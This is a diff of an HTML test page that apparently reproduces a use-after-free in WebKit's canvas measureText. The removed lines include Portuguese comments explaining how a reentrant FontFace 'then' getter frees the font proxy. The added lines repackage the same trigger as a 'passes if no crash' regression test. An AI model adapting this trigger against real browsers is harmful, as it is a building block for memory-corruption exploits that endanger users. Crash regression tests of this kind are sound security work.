@@ -1,54 +1,68 @@
-<!-- canvas2d-measuretext-uaf — FontProxy UAF via Vector reallocation -->
-<!-- Commit WebKit fe938b0a2301d3d3938b2f9f3c8cad60c7c2e1a6 -->
-<!-- rdar://185865732 -->
 <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+</head>
+<body>
+<p>This test passes if it does not crash.</p>
+<div id="status">Running...</div>
 <script>
-fetch('Ahem.woff')
-    .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
-        });
-    })
-    .then(function(dataUrl) {
+  
 
-        var face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
-        face.loaded;
-        document.fonts.add(face);
+  function finish(msg) {
+      document.getElementById('status').innerText = msg;
+    
+  }
 
-        var context = document.createElement('canvas').getContext('2d');
+  // Carrega o binário local para garantir o comportamento síncrono de reentrância
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', 'resources/Ahem.woff', false);
+  xhr.overrideMimeType('text/plain; charset=x-user-defined');
+  
+  try {
+      xhr.send();
+      if (xhr.status === 200 || xhr.status === 0) {
+          const text = xhr.responseText;
+          const bytes = new Uint8Array(text.length);
+          for (let i = 0; i < text.length; i++) {
+              bytes[i] = text.charCodeAt(i) & 0xff;
+          }
+          const blob = new Blob([bytes], { type: 'font/woff' });
+          const dataUrl = URL.createObjectURL(blob);
 
-        // 1 save previo: forca state stack do inline storage para o heap
-        context.save();
-        context.lineWidth = 0.5;
+          let face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
+          face.loaded;
+          document.fonts.add(face);
 
-        context.font = '10px MyTestFam';
+          let context = document.createElement('canvas').getContext('2d');
+          context.save();
+          context.lineWidth = 0.5;
+          context.font = '10px MyTestFam';
 
-        var reentered = false;
-        Object.defineProperty(FontFace.prototype, 'then', {
+          let reentered = false;
+          Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (reentered)
-                    return undefined;
-                reentered = true;
-                // 32 saves: forca REALLOCATION do buffer de heap
-                // O State que contem o FontProxy sendo usado por
-                // metricsOfPrimaryFont() estava no buffer antigo →
-                // buffer antigo liberado → FontProxy DESTRUIDO → UAF
-                for (var i = 0; i < 32; i++) {
-                    context.save();
-                    context.lineWidth = 1 + i;
-                }
-                reentered = false;
+              if (reentered)
                 return undefined;
+              reentered = true;
+              for (let i = 0; i < 18; i++) {
+                context.save();
+                context.lineWidth = 1 + i;
+              }
+              reentered = false;
+              return undefined;
             }
-        });
+          });
 
-        context.measureText('a');
-
-    });
+          context.measureText('a');
+          finish("PASS if no crash");
+      } else {
+          finish("FAIL: Ahem.woff not found");
+      }
+  } catch (e) {
+      finish("FAIL: " + e.message);
+  }
 </script>
-
+</body>
+</html>
